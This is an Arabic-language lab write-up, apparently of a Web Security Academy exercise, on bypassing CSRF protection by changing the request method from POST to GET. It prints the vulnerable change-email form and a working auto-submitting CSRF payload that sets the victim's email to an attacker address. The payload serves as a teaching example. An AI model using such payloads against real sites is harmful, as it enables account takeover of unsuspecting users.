فكرة اللاب ده هي أنه لازم يبقي فيه `csrf token` طول ما ال `request method` = `POST` 
ف لما غيرنا ال `request method` الي `GET` مكنش بيعمل `check` علي ال `csrf`

وده كان ال form بتاعت الفانكشن المصابة واللي بتاعت `change email`
```HTML
<form class="login-form" name="change-email-form" action="[/my-account/change-email](view-source:https://0a9f0077048a87e98219f6f100330057.web-security-academy.net/my-account/change-email)" method="POST">
	<label>Email</label>
	<input required type="email" name="email" value="">
	<input required name="csrf" value="VPAnOlHv4Om75YyduXZcEIwWKP146OLo">
	<button class='button' type='submit'> Update email </button>
</form>
```
ف خليتها كدة بحيث اني لو بعت الكود لشخص وداس عليه اقدر اغير الايميل بتاعه
```HTML
<form action="https://0a9f0077048a87e98219f6f100330057.web-security-academy.net/my-account/change-email" method="GET">
    <input required type="email" name="email" value="hacker@test.com">
</form>

<script> document.forms[0].submit(); </script>
```

### نتعلم اي من اللاب ده ؟

* اننا نجرب نغير في ال `request method` عشان نحاول نتخطي الحماية